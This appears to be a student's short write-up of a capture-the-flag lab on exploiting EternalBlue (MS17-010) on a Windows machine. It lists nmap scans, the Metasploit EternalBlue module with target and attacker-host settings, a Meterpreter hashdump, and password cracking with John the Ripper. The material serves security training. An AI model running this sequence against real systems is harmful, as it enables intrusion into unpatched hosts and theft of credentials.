# Blue- EternalBlue Room

## Objective
Gain administrator access to a vulnerable Windows machine using the MS17-010 (EternalBlue) vulnerability.

## Skills Learned
- Nmap scanning
- SMB enumeration
- Metasploit
- Meterpreter
- Windows command line
- Privilege escalation
- Finding flags

## Commands Used

nmap <ip>

nmap -sV <ip> & nmap -sC -sV <ip>

search ms17-010

use exploit/windows/smb/ms17_010_eternalblue

set RHOSTS <target ip> and LHOST <attacker_machine ip>

run

hashdump

jon the repper password decryption



## Key Takeaways

- Learned how to enumerate SMB services.
- Understood how EternalBlue can be exploited.
- Practiced navigating a Windows system after gaining access.
